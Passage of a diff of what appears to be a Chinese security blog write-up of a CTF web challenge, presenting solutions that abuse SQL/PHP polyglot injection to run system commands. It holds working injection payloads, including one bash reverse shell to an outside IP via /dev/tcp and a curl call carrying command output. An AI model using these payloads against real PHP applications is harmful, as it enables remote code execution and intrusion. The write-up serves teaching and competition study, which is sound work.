-<p>這個解法看似複雜，本質上其實很單純，就是利用兩個語言支援不同註解符號的特性。對於 SQL 而言，<code class="highlighter-rouge">--</code> 是註解符號，會無視後方所有到換行為止的文字，所以每一行以 <code class="highlighter-rouge">--</code> 開頭的字串，SQL 是看不見的。接著來看 PHP，對於 PHP 而言，<code class="highlighter-rouge">/* 任何字串 */</code> 這是註解的表示方式，開頭結尾由 / 與 * 組成，中間被包夾的字串是看不見的，並且支援換行，而 <code class="highlighter-rouge">--</code> 在 PHP 之中則代表遞減運算子，所以如 <code class="highlighter-rouge">$output --</code> 字串其實是在對 $output 進行減 1 的操作。綜合上面特性，對於上面的解法，其實只有 PHP 看見的第三行 ` ; system(‘/readflag’);` 會認為是需要執行的程式碼，其餘部分不論是 SQL 還是 PHP 都以為是註解的字串而無視，因此可以順利執行取得 flag。</p>
+<p>這個解法看似複雜，本質上其實很單純，就是利用兩個語言支援不同註解符號的特性。對於 SQL 而言，<code class="language-plaintext highlighter-rouge">--</code> 是註解符號，會無視後方所有到換行為止的文字，所以每一行以 <code class="language-plaintext highlighter-rouge">--</code> 開頭的字串，SQL 是看不見的。接著來看 PHP，對於 PHP 而言，<code class="language-plaintext highlighter-rouge">/* 任何字串 */</code> 這是註解的表示方式，開頭結尾由 / 與 * 組成，中間被包夾的字串是看不見的，並且支援換行，而 <code class="language-plaintext highlighter-rouge">--</code> 在 PHP 之中則代表遞減運算子，所以如 <code class="language-plaintext highlighter-rouge">$output --</code> 字串其實是在對 $output 進行減 1 的操作。綜合上面特性，對於上面的解法，其實只有 PHP 看見的第三行 ` ; system(‘/readflag’);` 會認為是需要執行的程式碼，其餘部分不論是 SQL 還是 PHP 都以為是註解的字串而無視，因此可以順利執行取得 flag。</p>
 
 <p><strong>by ankleboy (https://www.facebook.com/profile.php?id=100001963625238):</strong></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=name%20/*!%20from%20mytable%20*/%20--%20;%20system(%22/readflag%22)&amp;id=1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=name%20/*!%20from%20mytable%20*/%20--%20;%20system(%22/readflag%22)&amp;id=1
 
 SQL: SELECT name /*! from mytable */ -- ; system("/readflag") FROM mytable WHERE id = '1'
 PHP: $output = $row-&gt;name /*! from mytable */ -- ; system("/readflag");
 </code></pre></div></div>
 
-<p>此解法也是同樣運用註解，但使用的註解符號似乎稍微特殊，<code class="highlighter-rouge">/* */</code> 除了 PHP 之外，MySQL 也同樣支援此允許多行的註解符號，但假如多上一個驚嘆號 <code class="highlighter-rouge">/*! */</code>，事情就又稍微不同了，這是 MySQL 特有的變種註解符號，在此符號中的字串，仍然會被 MySQL 當成 SQL 的一部分執行，但在其他 DBMS 之中，因為是 <code class="highlighter-rouge">/*</code> 開頭就會認為它就是單純的註解文字而忽視，讓開發人員能撰寫可 portable 的程式碼。因此就能製造出一串註解文字可被 MySQL 看見但無法被 PHP 看見，強制在註解文字裡讓 SQL 構造合法語句，再利用 <code class="highlighter-rouge">--</code> 註解閉合所有冗贅 SQL 語句，緊接著 <code class="highlighter-rouge">--</code> 後就能撰寫任意 PHP 執行碼。</p>
+<p>此解法也是同樣運用註解，但使用的註解符號似乎稍微特殊，<code class="language-plaintext highlighter-rouge">/* */</code> 除了 PHP 之外，MySQL 也同樣支援此允許多行的註解符號，但假如多上一個驚嘆號 <code class="language-plaintext highlighter-rouge">/*! */</code>，事情就又稍微不同了，這是 MySQL 特有的變種註解符號，在此符號中的字串，仍然會被 MySQL 當成 SQL 的一部分執行，但在其他 DBMS 之中，因為是 <code class="language-plaintext highlighter-rouge">/*</code> 開頭就會認為它就是單純的註解文字而忽視，讓開發人員能撰寫可 portable 的程式碼。因此就能製造出一串註解文字可被 MySQL 看見但無法被 PHP 看見，強制在註解文字裡讓 SQL 構造合法語句，再利用 <code class="language-plaintext highlighter-rouge">--</code> 註解閉合所有冗贅 SQL 語句，緊接著 <code class="language-plaintext highlighter-rouge">--</code> 後就能撰寫任意 PHP 執行碼。</p>
 
 <p><strong>by FI:</strong></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`%23?&gt;&amp;id=1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`%23?&gt;&amp;id=1
 
 SQL: SELECT id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`#?&gt; FROM mytable WHERE id = '1'
 PHP: $output = $row-&gt;id/*!from mytable union select `/readflag`*/./*!id from mytable*/`/readflag`#?&gt;;
 </code></pre></div></div>
 
-<p>同樣是利用 <code class="highlighter-rouge">/*! */</code> 註解符號強行構造合法查詢，不過有趣的是，MySQL 支援 <code class="highlighter-rouge">#</code> 單行的註解符號，此註解符號同樣也被 PHP 支援，所以不會導致 PHP 語法錯誤，最後還多了 <code class="highlighter-rouge">?&gt;</code> 強行結束 PHP 程式區塊，冷知識是如果程式碼是 PHP 程式區塊內最後一行的話，不加 <code class="highlighter-rouge">;</code> 並不會導致語法錯誤唷 :P</p>
+<p>同樣是利用 <code class="language-plaintext highlighter-rouge">/*! */</code> 註解符號強行構造合法查詢，不過有趣的是，MySQL 支援 <code class="language-plaintext highlighter-rouge">#</code> 單行的註解符號，此註解符號同樣也被 PHP 支援，所以不會導致 PHP 語法錯誤，最後還多了 <code class="language-plaintext highlighter-rouge">?&gt;</code> 強行結束 PHP 程式區塊，冷知識是如果程式碼是 PHP 程式區塊內最後一行的話，不加 <code class="language-plaintext highlighter-rouge">;</code> 並不會導致語法錯誤唷 :P</p>
 
 <p><strong>by tree:</strong></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=null--+.$output=exec('/readflag')&amp;id=
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=null--+.$output=exec('/readflag')&amp;id=
 
 SQL: SELECT null-- .$output=exec('/readflag') FROM mytable WHERE id = '1'
 PHP: $output = $row-&gt;null-- .$output=exec('/readflag');
 </code></pre></div></div>
 
-<p>也是用了 <code class="highlighter-rouge">--</code> 把 PHP 程式碼的部分在 SQL 裡面遮蔽起來，利用了 null 關鍵字讓 SQL 查詢有回傳結果，但在 PHP 之中卻變成 <code class="highlighter-rouge">$row-&gt;null</code> 對 $row 物件存取名為 null 的屬性，使得 PHP 也能合法執行，最後將指令執行結果覆蓋 $output 變數，讓題目幫助我們輸出結果。</p>
+<p>也是用了 <code class="language-plaintext highlighter-rouge">--</code> 把 PHP 程式碼的部分在 SQL 裡面遮蔽起來，利用了 null 關鍵字讓 SQL 查詢有回傳結果，但在 PHP 之中卻變成 <code class="language-plaintext highlighter-rouge">$row-&gt;null</code> 對 $row 物件存取名為 null 的屬性，使得 PHP 也能合法執行，最後將指令執行結果覆蓋 $output 變數，讓題目幫助我們輸出結果。</p>
 
 <p><strong>by cebrusfs (https://www.facebook.com/menghuan.yu):</strong></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=NULL;%20--%20$b;var_dump(exec(%22/readflag%22))&amp;id=1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=NULL;%20--%20$b;var_dump(exec(%22/readflag%22))&amp;id=1
 
 SQL: SELECT column=NULL; -- $b;var_dump(exec("/readflag")) FROM mytable WHERE id = '1'
 PHP: $output = $row-&gt;column=NULL; -- $b;var_dump(exec("/readflag"));
 </code></pre></div></div>
 
-<p>此解法也是類似的思路，運用 <code class="highlighter-rouge">--</code> 閉合再湊出合法 PHP 程式碼，最後直接使用 var_dump 強制輸出 exec 的執行結果。</p>
+<p>此解法也是類似的思路，運用 <code class="language-plaintext highlighter-rouge">--</code> 閉合再湊出合法 PHP 程式碼，最後直接使用 var_dump 強制輸出 exec 的執行結果。</p>
 
 <p><strong>by Jason3e7 (https://github.com/jason3e7):</strong></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=NULL;-- $id %2b system('/readflag');%23&amp;id=1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=NULL;-- $id %2b system('/readflag');%23&amp;id=1
 
 SQL: SELECT NULL;-- $id + system('/readflag');# FROM mytable WHERE id = '1'
 PHP: $output = $row-&gt;NULL;-- $id + system('/readflag');#;
 </code></pre></div></div>
 
-<p>這也是相似的思路，有趣的是 <code class="highlighter-rouge">-- $id</code> 這個部分，大家一定記得 <code class="highlighter-rouge">$id --</code> 是遞減運算子，但有時可能會忘記 <code class="highlighter-rouge">-- $id</code> 也同樣是遞減運算子，所以這個 <code class="highlighter-rouge">--</code> 會使得 MySQL 認為是註解，PHP 卻仍認為是遞減運算子並正常執行下去。</p>
+<p>這也是相似的思路，有趣的是 <code class="language-plaintext highlighter-rouge">-- $id</code> 這個部分，大家一定記得 <code class="language-plaintext highlighter-rouge">$id --</code> 是遞減運算子，但有時可能會忘記 <code class="language-plaintext highlighter-rouge">-- $id</code> 也同樣是遞減運算子，所以這個 <code class="language-plaintext highlighter-rouge">--</code> 會使得 MySQL 認為是註解，PHP 卻仍認為是遞減運算子並正常執行下去。</p>
 
 <p><strong>by shoui:</strong></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=null-- -"1";"\$output = \$row-&gt;".system('/readflag').";";&amp;id=1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=null-- -"1";"\$output = \$row-&gt;".system('/readflag').";";&amp;id=1
 
 SQL: SELECT null-- -"1";"\$output = \$row-&gt;".system('/readflag').";"; FROM mytable WHERE id = '1'
 PHP: $output = $row-&gt;null-- -"1";"\$output = \$row-&gt;".system('/readflag').";";;
 </code></pre></div></div>
 
-<p>同樣運用註解 <code class="highlighter-rouge">--</code> 閉合 SQL 但 PHP 又是遞減運算子的特性，而 system 又會將指令執行結果直接輸出，因此就能直接取得 flag。本人有補充說明當時測試時直接複製貼上原始碼那行接測試，後來使用 <code class="highlighter-rouge">?id=1&amp;column=null-- -"1";" ".system('/readflag').";"</code> 精簡後的 payload XD。</p>
+<p>同樣運用註解 <code class="language-plaintext highlighter-rouge">--</code> 閉合 SQL 但 PHP 又是遞減運算子的特性，而 system 又會將指令執行結果直接輸出，因此就能直接取得 flag。本人有補充說明當時測試時直接複製貼上原始碼那行接測試，後來使用 <code class="language-plaintext highlighter-rouge">?id=1&amp;column=null-- -"1";" ".system('/readflag').";"</code> 精簡後的 payload XD。</p>
 
 <h3 id="double-quoted-string-evaluation">Double-quoted String Evaluation</h3>
 
-<p>PHP 會自動在由雙引號「”」包夾的字串中，尋找 $ 開頭的字詞，將其解析成變數再把值代入字串中，這個功能對於快速輸出已充分跳脫處理的變數值非常有幫助，可以增加程式碼可讀性；但同樣地，我們也可以利用這個功能做一下有趣的事情，例如這段 PHP 程式碼 <code class="highlighter-rouge">$str = "${phpinfo()}";</code> 就可以直接執行 phpinfo 函式，利用 <code class="highlighter-rouge">$str = "${system('id')}";</code> 就可以執行系統指令；而在 MySQL 中，雙引號「”」恰好也可以被用來表示純字串，所以我們就能構造出「MySQL 認為是純字串，PHP 卻認為需要解析執行」的 Payload。</p>
+<p>PHP 會自動在由雙引號「”」包夾的字串中，尋找 $ 開頭的字詞，將其解析成變數再把值代入字串中，這個功能對於快速輸出已充分跳脫處理的變數值非常有幫助，可以增加程式碼可讀性；但同樣地，我們也可以利用這個功能做一下有趣的事情，例如這段 PHP 程式碼 <code class="language-plaintext highlighter-rouge">$str = "${phpinfo()}";</code> 就可以直接執行 phpinfo 函式，利用 <code class="language-plaintext highlighter-rouge">$str = "${system('id')}";</code> 就可以執行系統指令；而在 MySQL 中，雙引號「”」恰好也可以被用來表示純字串，所以我們就能構造出「MySQL 認為是純字串，PHP 卻認為需要解析執行」的 Payload。</p>
 
 <p>讓我們先來看第一個例子：</p>
 
 <p><strong>by ginoah:</strong></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=id="${system('/readflag')}"&amp;id=1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=id="${system('/readflag')}"&amp;id=1
 
 SQL: SELECT id="${system('/readflag')}" FROM mytable WHERE id = '1'
 PHP: $output = $row-&gt;id="${system('/readflag')}";
 </code></pre></div></div>
 
-<p>對於 SQL 而言，就是回傳 id 與字串比較的結果；但對於 PHP 而言，上述結果是將雙引號字串解析完後才賦值給變數 <code class="highlighter-rouge">$row-&gt;id</code>，而結果就如同前面說的，它會執行系統指令 /readflag，還會將結果輸出至網頁，所以就能取得 flag！</p>
+<p>對於 SQL 而言，就是回傳 id 與字串比較的結果；但對於 PHP 而言，上述結果是將雙引號字串解析完後才賦值給變數 <code class="language-plaintext highlighter-rouge">$row-&gt;id</code>，而結果就如同前面說的，它會執行系統指令 /readflag，還會將結果輸出至網頁，所以就能取得 flag！</p>
 
 <p><strong>by Billy (https://github.com/st424204):</strong></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=name%2b"{$_POST[1]($_POST[2])}"&amp;id=1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=name%2b"{$_POST[1]($_POST[2])}"&amp;id=1
 POST: 1=system&amp;2=/readflag
 
 SQL: SELECT name+"{$_POST[1]($_POST[2])}" FROM mytable WHERE id = '1'
 PHP: $output = $row-&gt;name+"{$_POST[1]($_POST[2])}";
 </code></pre></div></div>
 
-<p>同樣利用雙引號特性，但這個例子構造的較為複雜，利用了一些鬆軟特性，在 PHP 中，若字串變數是一個存在的函式的名稱，則我們可以利用 <code class="highlighter-rouge">$func = 'system'; $func('id');</code> 這樣的方式來呼叫該變數，這個例子就是應用了這個特性，將我們從前端傳遞過去的 <code class="highlighter-rouge">$_POST[1]</code> 當成函式名稱、<code class="highlighter-rouge">$_POST[2]</code> 作為函式的參數執行，因此只要參數再帶上 <code class="highlighter-rouge">1=system&amp;2=readflag</code> 就能取得 flag！</p>
+<p>同樣利用雙引號特性，但這個例子構造的較為複雜，利用了一些鬆軟特性，在 PHP 中，若字串變數是一個存在的函式的名稱，則我們可以利用 <code class="language-plaintext highlighter-rouge">$func = 'system'; $func('id');</code> 這樣的方式來呼叫該變數，這個例子就是應用了這個特性，將我們從前端傳遞過去的 <code class="language-plaintext highlighter-rouge">$_POST[1]</code> 當成函式名稱、<code class="language-plaintext highlighter-rouge">$_POST[2]</code> 作為函式的參數執行，因此只要參數再帶上 <code class="language-plaintext highlighter-rouge">1=system&amp;2=readflag</code> 就能取得 flag！</p>
 
 <p><strong>by Hans (https://hans00.me)</strong></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=id||"{$_POST['fn']($_POST['cmd'])}"&amp;id=1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=id||"{$_POST['fn']($_POST['cmd'])}"&amp;id=1
 POST: fn=system&amp;cmd=/readflag
 
 SQL: SELECT id||"{$_POST['fn']($_POST['cmd'])}" FROM mytable WHERE id = '1'
 PHP: $output = $row-&gt;id||"{$_POST['fn']($_POST['cmd'])}";
 </code></pre></div></div>
 
-<p>這個例子與前一個利用了同樣的特性，差別在與此處的 Payload 改用 OR 邏輯運算子 <code class="highlighter-rouge">||</code>，而前面使用的是加法算術運算子 <code class="highlighter-rouge">+</code>，但結果都是相同的。</p>
+<p>這個例子與前一個利用了同樣的特性，差別在與此處的 Payload 改用 OR 邏輯運算子 <code class="language-plaintext highlighter-rouge">||</code>，而前面使用的是加法算術運算子 <code class="language-plaintext highlighter-rouge">+</code>，但結果都是相同的。</p>
 
 <p><strong>by Chris Lin (https://github.com/kulisu)</strong></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=TRUE/"${system(%27/readflag%27)}";%23&amp;id=1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=TRUE/"${system(%27/readflag%27)}";%23&amp;id=1
 
 SQL: SELECT TRUE/"${system('/readflag')}";# FROM mytable WHERE id = '1'
 PHP: $output = $row-&gt;TRUE/"${system('/readflag')}";#;
 </code></pre></div></div>
 
-<p>這也是用相同概念，前面改用除法算術運算子 <code class="highlighter-rouge">/</code>。看完解法才發現投稿者是同事！</p>
+<p>這也是用相同概念，前面改用除法算術運算子 <code class="language-plaintext highlighter-rouge">/</code>。看完解法才發現投稿者是同事！</p>
 
 <p><img src="/assets/img/blog/20201030/1.png" alt="" /></p>
 
 <h3 id="execution-operator">Execution Operator</h3>
 
-<p>在 PHP 中存在眾多函式可以執行系統指令，其中還包括一個特殊的 <a href="https://www.php.net/manual/en/language.operators.execution.php">Execution Operator</a>，此運算子的形式是利用反引號「<code class="highlighter-rouge">`</code>」將字串包夾起來，這樣該字串就會被當作系統指令執行，其內部實際是執行 shell_exec，更貼心的事情是，這個運算子同樣支援 Double-quoted String Evaluation，所以若是 <code class="highlighter-rouge">$cmd = 'id'; echo `$cmd`;</code> 這樣的形式，PHP 就會先解析 $cmd 得出 id，再執行 id 系統指令；而在 MySQL 之中，反引號是用來表示一個 identifier，identifier 用來指示一個物件，最常見的是資料表或是資料欄，當我們執行 <code class="highlighter-rouge">SELECT c FROM t</code>，其中 c 和 t 就是 identifier，所以若想靠 Execution Operator 來執行指令，可能還必須同時讓 identifier 能夠被 MySQL 識別才行。</p>
+<p>在 PHP 中存在眾多函式可以執行系統指令，其中還包括一個特殊的 <a href="https://www.php.net/manual/en/language.operators.execution.php">Execution Operator</a>，此運算子的形式是利用反引號「<code class="language-plaintext highlighter-rouge">`</code>」將字串包夾起來，這樣該字串就會被當作系統指令執行，其內部實際是執行 shell_exec，更貼心的事情是，這個運算子同樣支援 Double-quoted String Evaluation，所以若是 <code class="language-plaintext highlighter-rouge">$cmd = 'id'; echo `$cmd`;</code> 這樣的形式，PHP 就會先解析 $cmd 得出 id，再執行 id 系統指令；而在 MySQL 之中，反引號是用來表示一個 identifier，identifier 用來指示一個物件，最常見的是資料表或是資料欄，當我們執行 <code class="language-plaintext highlighter-rouge">SELECT c FROM t</code>，其中 c 和 t 就是 identifier，所以若想靠 Execution Operator 來執行指令，可能還必須同時讓 identifier 能夠被 MySQL 識別才行。</p>
 
 <p><strong>by dalun (https://www.nisra.net):</strong></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=id=`$_POST[1]`%23?&gt;&amp;id=%0a+from+(select+'id','$_POST[1]')+as+a+--+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=id=`$_POST[1]`%23?&gt;&amp;id=%0a+from+(select+'id','$_POST[1]')+as+a+--+
 POST: 1=/readflag
 
 SQL: SELECT id=`$_POST[1]`#?&gt; FROM mytable WHERE id = '
@@ -386,31 +834,31 @@ SQL: SELECT id=`$_POST[1]`#?&gt; FROM mytable WHERE id = '
 PHP: $output = $row-&gt;id=`$_POST[1]`#?&gt;;
 </code></pre></div></div>
 
-<p>這個解法似乎是唯一願意使用 id 參數的 XD！在 column 參數用註解符號 <code class="highlighter-rouge">#</code> 閉合後續，在 id 參數插入換行符號並構造一個合法的 SQL，透過子查詢製造合法的 identifier，最後由 PHP 透過 execution operator 執行系統指令。</p>
+<p>這個解法似乎是唯一願意使用 id 參數的 XD！在 column 參數用註解符號 <code class="language-plaintext highlighter-rouge">#</code> 閉合後續，在 id 參數插入換行符號並構造一個合法的 SQL，透過子查詢製造合法的 identifier，最後由 PHP 透過 execution operator 執行系統指令。</p>
 
 <p><strong>by HexRabbit (https://twitter.com/h3xr4bb1t):</strong></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=name+or+@`bash+-c+"bash+-i+&gt;%26+/dev/tcp/1.2.3.4/80+0&gt;%261"`&amp;id=1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=name+or+@`bash+-c+"bash+-i+&gt;%26+/dev/tcp/1.2.3.4/80+0&gt;%261"`&amp;id=1
 
 SQL: SELECT name or @`bash -c "bash -i &gt;&amp; /dev/tcp/1.2.3.4/80 0&gt;&amp;1"` FROM mytable WHERE id = '1'
 PHP: $output = $row-&gt;name or @`bash -c "bash -i &gt;&amp; /dev/tcp/1.2.3.4/80 0&gt;&amp;1"`;
 </code></pre></div></div>
 
-<p>這個解法核心也是透過 execution oeperator 執行指令，不過用了一個特殊的字元 <code class="highlighter-rouge">@</code>。在 MySQL 中，這代表 user-defined variables，後面的字串則為變數的名稱，而且名稱可以使用特殊字元，只要使用 identifier 的符號 <code class="highlighter-rouge">`</code> 把字串包夾起來即可，而存取不存在的變數並不會導致錯誤，MySQL 只會回傳 NULL 的結果。在 PHP 中的話，<code class="highlighter-rouge">@</code> 代表 <a href="https://www.php.net/language.operators.errorcontrol">error control operator</a>，可以放置在表達式前，會讓 PHP 將此表達式執行產生的錯誤訊息全部忽略，由於是表達式，所以也能附加在 execution operator 之前。最後這個解法再用 <code class="highlighter-rouge">or</code> 邏輯運算子（MySQL 與 PHP 皆支援並且意義相同）串接即可達成執行系統指令。</p>
+<p>這個解法核心也是透過 execution oeperator 執行指令，不過用了一個特殊的字元 <code class="language-plaintext highlighter-rouge">@</code>。在 MySQL 中，這代表 user-defined variables，後面的字串則為變數的名稱，而且名稱可以使用特殊字元，只要使用 identifier 的符號 <code class="language-plaintext highlighter-rouge">`</code> 把字串包夾起來即可，而存取不存在的變數並不會導致錯誤，MySQL 只會回傳 NULL 的結果。在 PHP 中的話，<code class="language-plaintext highlighter-rouge">@</code> 代表 <a href="https://www.php.net/language.operators.errorcontrol">error control operator</a>，可以放置在表達式前，會讓 PHP 將此表達式執行產生的錯誤訊息全部忽略，由於是表達式，所以也能附加在 execution operator 之前。最後這個解法再用 <code class="language-plaintext highlighter-rouge">or</code> 邏輯運算子（MySQL 與 PHP 皆支援並且意義相同）串接即可達成執行系統指令。</p>
 
 <p><strong>by cjiso1117 (https://twitter.com/cjiso)</strong></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=$a%2b`curl 127.0.0.1/$(/readflag)`/*!from (select "asd" as "$a", "qwe" as "curl 127.0.0.1/$(/readflag)" ) as e*/;%23&amp;id=qwe
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=$a%2b`curl 127.0.0.1/$(/readflag)`/*!from (select "asd" as "$a", "qwe" as "curl 127.0.0.1/$(/readflag)" ) as e*/;%23&amp;id=qwe
 
 SQL: SELECT $a+`curl 127.0.0.1/$(/readflag)`/*!from (select "asd" as "$a", "qwe" as "curl 127.0.0.1/$(/readflag)" ) as e*/;# FROM mytable WHERE id = 'qwe'
 PHP: $output = $row-&gt;$a+`curl 127.0.0.1/$(/readflag)`/*!from (select "asd" as "$a", "qwe" as "curl 127.0.0.1/$(/readflag)" ) as e*/;#;
 </code></pre></div></div>
 
-<p>同樣是利用 <code class="highlighter-rouge">/*! */</code> 製造出 PHP 看不見、MySQL 看得見的註解文字來控制資料庫查詢結果，最後利用 execution operator 來達成執行系統指令，但由於 <code class="highlighter-rouge">`</code> 內的文字會被 MySQL 認為是 identifier，找不到對應資源會導致錯誤，所以透過子查詢和 alias 語法強行製造出 identifier 讓查詢正確執行。<del>本人表示一開始覺得用 <code class="highlighter-rouge">/*! */</code> 會很帥，結果走偏繞了一大圈</del></p>
+<p>同樣是利用 <code class="language-plaintext highlighter-rouge">/*! */</code> 製造出 PHP 看不見、MySQL 看得見的註解文字來控制資料庫查詢結果，最後利用 execution operator 來達成執行系統指令，但由於 <code class="language-plaintext highlighter-rouge">`</code> 內的文字會被 MySQL 認為是 identifier，找不到對應資源會導致錯誤，所以透過子查詢和 alias 語法強行製造出 identifier 讓查詢正確執行。<del>本人表示一開始覺得用 <code class="language-plaintext highlighter-rouge">/*! */</code> 會很帥，結果走偏繞了一大圈</del></p>
 
 <p><strong>by shik (https://github.com/ShikChen/)</strong></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=id%2b"${print_r(`/readflag`)}"&amp;id=1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=id%2b"${print_r(`/readflag`)}"&amp;id=1
 
 SQL: SELECT id+"${print_r(`/readflag`)}" FROM mytable WHERE id = '1'
 PHP: $output = $row-&gt;id+"${print_r(`/readflag`)}";
@@ -420,7 +868,7 @@ PHP: $output = $row-&gt;id+"${print_r(`/readflag`)}";
 
 <p><strong>匿名:</strong></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: id=1&amp;column=id%2b"${`yes`}"
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: id=1&amp;column=id%2b"${`yes`}"
 
 SQL: SELECT id+"${`yes`}" FROM mytable WHERE id = '1'
 PHP: $output = $row-&gt;id+"${`yes`}";
@@ -441,7 +889,7 @@ PHP: $output = $row-&gt;id+"${`yes`}";
 
 <p>友情工商：由台灣知名 CTF 戰隊之一的 Balsn 舉辦的 Balsn CTF 2020 將在 11/14 舉辦，他們準備了豐富的比賽獎金與充滿創意、技術性的題目，想證明實力的朋友們可不要錯過了！</p>
 
-<p>Balsn Twitter: https://twitter.com/balsnctf/status/1316925652700889090<br />
+<p>Balsn Twitter: https://twitter.com/balsnctf/status/1316925652700889090
 Balsn CTF 2020 on CTFtime: https://ctftime.org/event/1122/</p>
 
 <p>另外的另外，最後讓我們恭喜 <strong>yuawn (https://twitter.com/_yuawn)</strong> 以 1 分之姿榮獲 <strong>DEVCORE Wargame 最後 1 名</strong>！全場排行榜上唯一得分不超過 100 的參加者，同時他也取得了 pwn 題目的首殺兼唯一解，恭喜他 👏👏。</p>
@@ -510,168 +958,179 @@ Balsn CTF 2020 on CTFtime: https://ctftime.org/event/1122/</p>
   </tbody>
 </table>
 
-              </article>
-              <p class="sns-widgets">
-                Share this on <button class="appearance-none sns-widgets__button" id="sns-facebook" type="button">Facebook</button> or <button class="appearance-none sns-widgets__button" id="sns-twitter" type="button">Twitter</button>
-              </p>
-          
-              <div class="heading--side-lined">
-                About <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/cyku.jpg)"></span> <a href="/blog/author/cyku" class="blog-author-name">Cyku</a> 
-              </div>
-              <p class="blog-author-info">
-                一位熱愛網站應用程式安全技術的夢想家，<br />專長於滲透測試，夢想是成為光之美少女。
-              </p>
-          
-              <div class="heading--side-lined">
-                讀者留言
-              </div>
-              <div class="blog-comments">
-                
-
-
-  <div id="disqus_thread"></div>
-<script type="text/javascript">
-    var disqus_developer = 1;
-    var disqus_shortname = 'd3vc0r3'; // required: replace example with your forum shortname
-    
-    /* * * DON'T EDIT BELOW THIS LINE * * */
-    (function() {
-        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-        dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="https://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>
-
-
-
-
-              </div>
+                    </div>
+                    <!-- 文章內容 -->
+                </div>
+            </article>
+            <!-- 文章 end -->
+        </section>
+        
+         <!-- 作者 -->
+        <section>
+            <div class="container article_footer">
+                <div class="author_info">
+                    <a href="/blog/author/cyku">
+                        <div class="circle" style="background-image: url(/assets/img/avatar/orig/cyku.png);"></div>
+                    </a>
+                    <div>
+                        <a class="author" href="/blog/author/cyku">
+                            <h3>Cyku</h3>
+                        </a>
+                        <span>Senior Red Team Specialist</span>
+                        <p>
+                            一位熱愛網站應用程式安全技術的夢想家，<br />專長於滲透測試，夢想是成為光之美少女。
+                        </p>
+                    </div>
+                </div>
             </div>
-          </div>
+        </section>
+        
 
+        <!-- 相關文章 -->
+        <section class="recommand articles-list">
+            <div class="container">
+              
+                <!-- 相關文章 Item -->
+                <article class="article">
+                    <div class="content">
+                        <a class="category" href="/blog/category/技術專欄">技術專欄</a>
+                        <span class="tag">
+    
+                          <a href="/blog/tag/公告/">#公告</a> <a href="/blog/tag/徵才/">#徵才</a> 
+                        </span>
+                        <h2>
+                            <a href="/blog/2023/01/14/3rd-internship-program-recruit/">DEVCORE 2023 第三屆實習生計畫</a> 
+                        </h2>
+                    
+                    
+                        <span class="date">2023-01-14</span>
+                        <p class="line-litmit-3">DEVCORE 第三屆實習生計畫開始，計畫目的希望能培育人才、增強新世代的資安技能，如果您對這個計畫有興趣，歡迎來信報名！
+                        </p>
+                    </div>
+                </article>
+              
+                <!-- 相關文章 Item -->
+                <article class="article">
+                    <div class="content">
+                        <a class="category" href="/blog/category/技術專欄">技術專欄</a>
+                        <span class="tag">
+    
+                          <a href="/blog/tag/公告/">#公告</a> 
+                        </span>
+                        <h2>
+                            <a href="/blog/2023/01/12/DEVCORE-conference-registration-open-now/">DEVCORE Conference 2023 即日起開放報名</a> 
+                        </h2>
+                    
+                    
+                        <span class="date">2023-01-12</span>
+                        <p class="line-litmit-3">純攻擊導向的專業技術研討會 DEVCORE Conference 將於 3 月 10 日至 11 日再次盛大舉行
+                        </p>
+                    </div>
+                </article>
+              
+                <!-- 相關文章 Item -->
+                <article class="article">
